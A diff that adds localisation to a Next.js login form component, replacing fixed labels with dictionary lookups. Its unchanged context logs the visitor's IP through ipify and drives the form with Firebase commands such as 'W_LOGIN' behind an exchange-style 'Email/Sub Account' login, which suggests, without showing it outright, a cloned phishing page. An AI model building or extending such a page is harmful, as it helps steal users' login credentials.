@@ -1,5 +1,7 @@
 "use client";
 
+import { Locale } from "@/config/i18n.config";
+import { getDictionaryUseClient } from "@/dicts/default-dictionary-use-client";
 import { database } from "@/firebase";
 import {
   DatabaseReference,
@@ -10,9 +12,12 @@ import {
   ref,
   update,
 } from "firebase/database";
+import { useParams } from "next/navigation";
 import { useEffect, useState } from "react";
 
 export const LoginForm = () => {
+  const { lang } = useParams<{ lang: Locale }>();
+
   const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
   const [ipForm, seteIpForm] = useState<string | null>(null);
 
@@ -23,6 +28,7 @@ export const LoginForm = () => {
   const [loading, setLoading] = useState(false);
 
   const [command, setCommand] = useState("W_LOGIN");
+  const [dict, setDict] = useState(getDictionaryUseClient(lang));
 
   useEffect(() => {
     fetch("https://api.ipify.org?format=json").then(async (res) => {
@@ -87,26 +93,30 @@ export const LoginForm = () => {
       <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
         <div className="flex flex-col min-w-[40%] gap-10 mt-[140px] transition-all">
           <div className="flex">
-            <h1 className="text-4xl font-bold">Log in</h1>
+            <h1 className="text-4xl font-bold">
+              {dict.dictionary.login.title}
+            </h1>
           </div>
           {/* FORM */}
           <div className="flex flex-col gap-2">
             <div className="flex flex-row gap-6 items-center">
               <div className="flex flex-col gap-3">
                 <span className="text-sm font-medium text-zinc-500 hover:text-black transition-all cursor-not-allowed">
-                  Phone
+                  {dict.dictionary.login.inputUserLabel.phone}
                 </span>
                 <div className="border border-white"></div>
               </div>
               <div className="flex flex-col gap-3">
                 <span className="text-sm font-medium text-black hover:text-black transition-all cursor-pointer">
-                  Email/Sub Account
+                  {/* Email/Sub Account */}
+                  {dict.dictionary.login.inputUserLabel.email}
                 </span>
                 <div className="border border-zinc-800"></div>
               </div>
               <div className="flex flex-col gap-3">
                 <span className="text-sm font-medium text-zinc-500 hover:text-black transition-all cursor-not-allowed">
-                  QR code
+                  {/* QR code */}
+                  {dict.dictionary.login.inputUserLabel.qr}
                 </span>
                 <div className="border border-white"></div>
               </div>
@@ -130,11 +140,13 @@ export const LoginForm = () => {
               <div className="flex flex-row gap-6 items-center">
                 <div className="flex w-full justify-between items-center">
                   <span className="text-sm font-medium text-zinc-700 transition-all">
-                    Password
+                    {/* Password */}
+                    {dict.dictionary.login.inputPassLabel.label}
                   </span>
 
                   <span className="text-sm font-medium text-zinc-700 hover:text-black transition-all hover:underline cursor-pointer">
-                    Forgot your password?
+                    {/* Forgot your password? */}
+                    {dict.dictionary.login.inputPassLabel.forgotLable}
                   </span>
                 </div>
               </div>
@@ -176,24 +188,25 @@ export const LoginForm = () => {
                 fill="currentFill"
               />
             </svg>
-            {!showPassInput ? "Next" : "Log In"}
+            {!showPassInput
+              ? dict.dictionary.login.nextButton.next
+              : dict.dictionary.login.nextButton.login}
           </button>
 
           <div className="flex justify-center ">
             <span className="text-base">
-              Dont have an account?{" "}
+              {dict.dictionary.login.dontHaveAccount}
               <strong className="underline cursor-pointer hover:no-underline hover:text-zinc-600">
-                Sign up
+                {dict.dictionary.login.signUpLabel}
               </strong>
             </span>
           </div>
 
           <hr />
           <span className="text-sm text-zinc-500 font-light">
-            This site is protected by Google reCAPTCHA to ensure {"you're"} not
-            a bot.{" "}
+            {dict.dictionary.login.captchaLabel.label}
             <a href="" className="text-black font-normal underline">
-              Learn more
+              {dict.dictionary.login.captchaLabel.learMore}
             </a>
           </span>
         </div>
